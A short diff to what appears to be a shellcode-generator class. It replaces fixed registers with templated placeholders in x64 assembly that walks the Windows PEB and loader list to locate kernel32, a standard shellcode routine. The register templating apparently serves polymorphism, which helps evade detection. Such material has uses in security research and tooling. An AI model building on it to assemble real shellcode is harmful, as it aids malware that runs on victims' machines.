@@ -108,21 +108,21 @@ class Shellcode():
 ; }}
 
 getKernel32:
-    mov dl, 0x4b
+    mov {dl}, 0x4b
 getPEB:
-    mov rcx, 0x60
-    mov {r8}, gs:[rcx]
+    mov {rcx}, 0x60
+    mov {r8}, gs:[{rcx}]
 getHeadEntry:
     mov {rdi}, [{r8} + 0x18]
     mov {rdi}, [{rdi} + 0x30]
 search:
-    xor rcx, rcx
+    xor {rcx}, {rcx}
     mov rax, [{rdi} + 0x10]
     mov {rsi}, [{rdi} + 0x40]
     mov {rdi}, [{rdi}]
-    cmp [{rsi} + 0x18], cx
+    cmp [{rsi} + 0x18], {cx}
     jne search
-    cmp [{rsi}], dl
+    cmp [{rsi}], {dl}
     jne search
     ret
         """
